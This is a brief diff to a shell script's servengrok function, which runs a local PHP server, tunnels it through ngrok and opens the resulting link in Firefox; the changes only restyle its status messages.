@@ -742,13 +742,13 @@ servengrok() {
 	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local PHP server on port \e[97m\e[5m$1 \e[25m...\n"
 	cd site && php -S 127.0.0.1:$1 > /dev/null 2>&1 & 
 	sleep 2
-	printf "\e[92mStarting ngrok server...\n"
+	printf "\e[1;92m[\e[0m*\e[1;92m]Starting ngrok server...\n"
 	./ngrok http $1 > /dev/null 2>&1 &
 	sleep 5
 	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-	printf "\e[92m Your new server: \e[37;1m$link\n" 
+	printf "\e[1;92m[\e[0m*\e[1;92m] Congrats!!!  Your new server: \e[37;1m$link\n" 
 	printf "\n"
-	printf "\e[92mOpening with Firefox in 3 seconds\n"
+	printf "\e[1;92m[\e[0m*\e[1;92m]Opening with Firefox in 3 seconds\n"
 	sleep 3 
 	firefox $link $link/installs.php
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
